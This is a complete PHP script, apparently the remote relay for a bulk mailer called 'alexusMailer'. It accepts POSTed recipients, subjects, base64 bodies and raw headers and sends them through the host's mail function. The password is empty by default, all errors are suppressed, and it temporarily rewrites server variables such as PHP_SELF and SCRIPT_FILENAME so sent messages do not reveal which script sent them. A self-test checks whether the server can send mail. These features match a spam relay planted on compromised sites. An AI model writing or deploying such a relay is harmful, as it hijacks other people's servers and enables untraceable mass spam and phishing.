<?php 
$pass=""; //FORMAT: md5(IMAILpassword); 

#----------------------------------------
define("VERSION", "1.0");
ini_set('display_errors',0);//1
ini_set('display_startup_errors',0);//1
error_reporting(0);//-1

if($pass!="" && md5("IMAIL".$_POST['pass'])!=$pass) {
	print json_encode(array("error"=>"wrong password"));
	exit;
}
if($_POST['req']=="test" || $_GET['req']=="test")
	print json_encode(selfTest());
elseif($_POST['req']=="mail") {
	$data=json_decode($_POST['data'],true);
	print json_encode(alexusMailer($data));
} else {
	print json_encode(array(
		"status"=> "BAD",
		"error"	=> "bad request"
	));
}
exit;
//Самотестирование
function selfTest() {
	$test_result=false;
	$test_result=function_exists("json_decode") && function_exists("base64_decode") && function_exists("mail");
	if($test_result) {
		$result=array(
			"status"=>"GOOD"
		);
	} else {
		$result=array(
			"status"=> "BAD",
			"error"	=> "can't send from this server"
		);
	}
	return $result;
}
//Интеграция с alexusMailer
function alexusMailer($data) {
	$hide=array('PHP_SELF'=>'','SCRIPT_FILENAME'=>'','REQUEST_URI'=>'','SCRIPT_NAME'=>'');
	while(list($key,)=each($hide)){
		$hide[$key]=$_SERVER[$key];
		$_SERVER[$key]='/';
	}
	if(function_exists("mb_orig_mail"))
		mb_orig_mail($data['to'],$data['subject'],base64_decode($data['content']),$data['header']);
	else
		mail($data['to'],$data['subject'],base64_decode($data['content']),$data['header']);
	reset($hide);
	while(list($key,)=each($hide))
		$_SERVER[$key]=$hide[$key];
	
	$result=array(
		"status"=>"GOOD"
	);
	return $result;
}
?>